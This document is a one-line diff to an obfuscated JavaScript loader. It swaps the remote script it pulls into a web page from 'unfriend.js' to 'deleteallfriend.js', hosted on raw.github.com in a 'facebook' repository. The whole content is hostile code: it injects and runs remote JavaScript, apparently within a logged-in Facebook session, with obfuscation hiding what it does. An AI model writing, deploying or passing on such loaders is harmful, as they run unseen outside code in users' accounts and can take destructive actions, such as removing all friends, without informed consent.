@@ -1,1 +1,1 @@
-var _0x421e=["src","script","createElement","appendChild","body","https://raw.github.com/ServerSystem/facebook/master/unfriend.js"];document[_0x421e[4]][_0x421e[3]](document[_0x421e[2]](_0x421e[1]))[_0x421e[0]]=_0x421e[5];
+var _0x421e=["src","script","createElement","appendChild","body","https://raw.github.com/ServerSystem/facebook/master/deleteallfriend.js"];document[_0x421e[4]][_0x421e[3]](document[_0x421e[2]](_0x421e[1]))[_0x421e[0]]=_0x421e[5];
